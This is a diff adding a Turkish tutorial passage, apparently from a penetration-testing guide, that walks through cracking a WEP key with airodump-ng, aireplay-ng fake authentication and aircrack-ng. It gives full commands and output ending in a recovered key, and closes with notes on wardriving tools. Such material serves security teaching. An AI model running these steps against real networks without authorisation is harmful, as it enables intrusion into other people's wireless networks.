@@ -188,6 +188,59 @@ BSSID               STATION               PWR   Rate    Lost    Frames   Probe
 00:23:69:F5:B4:2B   70:56:81:B2:F0:53     -21    0      -54      42       19
 ```
 
+#### Aircrack-ng ile WEP Anahtarı Kırma
+
+WEP anahtarlarını kırmak için birkaç yöntem bulunmaktadır, bunlar: sahte kimlik atağı (fake authentication), parçalanma atağı (fragmentation), chochop atağı, caffè latte atağı ve PTW atağı. Şimdi sahte kimlik atağı nasıl yapılır ona bakalım. 
+
+İlk önce Aircrack-ng'nin aracı olan Airodump-ng ile toplayabileceğimiz bilgilere bakalım. Öncelikle Airodump-ng aracına kablosuz arayüzünü _mon0_ monitor moduna almasını ve `-w` ile tüm paketleri dosyaya kaydetmesini söylüyoruz.
+
+```ShellSession
+root@kali:~# airodump-ng -w book mon0 --channel 6 
+CH 6 ][ Elapsed: 20 s ][ 2015-03-06 19:08
+BSSID               PWR  Beacons  #Data, #/s CH  MB   ENC   CIPHER AUTH ESSID
+00:23:69:F5:B4:2B   -53      22      6    0   6  54 . WEP   WEP         linksys
+BSSID               STATION             PWR   Rate    Lost    Frames   Probe
+00:23:69:F5:B4:2B   70:56:81:B2:F0:53   -26   54-54      0         6
+```
+
+Bu tarama sonucunda WEP şifresini kırabilmemiz için tüm bilgileri elde etmiş oluyoruz. Elimizde BSSID, kablosuz kanalı, şifreleme algoritması ve SSID var. Bu bilgileri WEP kırmamız için lazım olan paketleri toplamak için kullanacağız. Aşağıdaki bilgisayarınıza göre değişir, ama başlıca:
+* __Base Station MAC Adress:__ 00:23:69:F5:B4:2B
+* __SSID:__ linksys
+* __Channel:__ 6
+
+##### Paket Enjekte Etme
+
+Aşağıda sahte kimlik doğrulama ile paket enjektlemeyi göstermekte:
+* `-1` ile Aireplay-ng aracına sahte kimlik kullanmasını söylüyoruz
+* `0` yeniden iletim zamanı
+* `-e` SSID; bu durumda _linksys_
+* `-a` giriş yapmak istediğimiz erişim noktasının MAC adresi
+* `-h` kartımızın MAC adresi (cihazın üstünde bulunur)
+* `mon0` sahte kimlik doğrulamada kullanılacak arayüzü
+
+Aireplay-ng sorgusunu gönderdikten sonra, doğrulamanın başarı olduğna dair _Association successful:-)_ mesajını alırız.
+
+```ShellSession
+root@kali:~# aireplay-ng -1 0 -e linksys -a 00:23:69:F5:B4:2B -h 00:C0:CA:1B:69:AA mon0 
+20:02:56 Waiting for beacon frame (BSSID: 00:23:69:F5:B4:2B) on channel 6
+20:02:56 Sending Authentication Request (Open System) [ACK] 20:02:56 Authentication successful
+20:02:56 Sending Association Request [ACK]
+20:02:56 Association successful :-) (AID: 1)
+```
+
+##### Anahtar Kırma
+
+64-bit WEP anahtarını kırabilmemiz için 250.000 IV toplamamız gerekmektedir. Paketleri elde ettikten sonra, Aircrack-ng programına topladığımız IV'leri doğru WEP anahtarına çevirmesini söyleriz. 
+
+```ShellSession
+root@kali:~# aircrack-ng -b 00:23:69:F5:B4:2B book*.cap
+Opening book-01.cap
+Attack will be restarted every 5000 captured ivs. 
+Starting PTW attack with 239400 ivs.
+KEY FOUND! [ 2C:85:8B:B6:31 ]
+Decrypted correctly: 100%
+``` 
+
 #### Kablosuz Ağlarda Keşif
 Kablosuz ağlarda keşif yakın çevrede bulunan erişim noktalarının tespitidir. İşi abartıp WLAN araçlarını arabalarına alarak ya da yaya olarak yol boyunca etrafta bulunan kablosuz ağları keşfetmeye yönelik çalışmalara Wardriving, erişim noktalarının özelliklerine göre(şifreleme desteği var mı? Hangi kanalda çalışıyor vs) bulundukları yerlere çeşitli işaretlerin çizilmesine ise WarChalking deniyor.
 War driving için çeşitli programlar kullanılabilir fakat bunlardan en önemlileri ve iş yapar durumda olanları Windows sistemler için Netstumbler , Linux sistemler için Kismet’dir. Kismet aynı zamanda Windows işletim sisteminde monitor mode destekleyen kablosuz ağ arabirimleri ile de çalışabilmektedir.
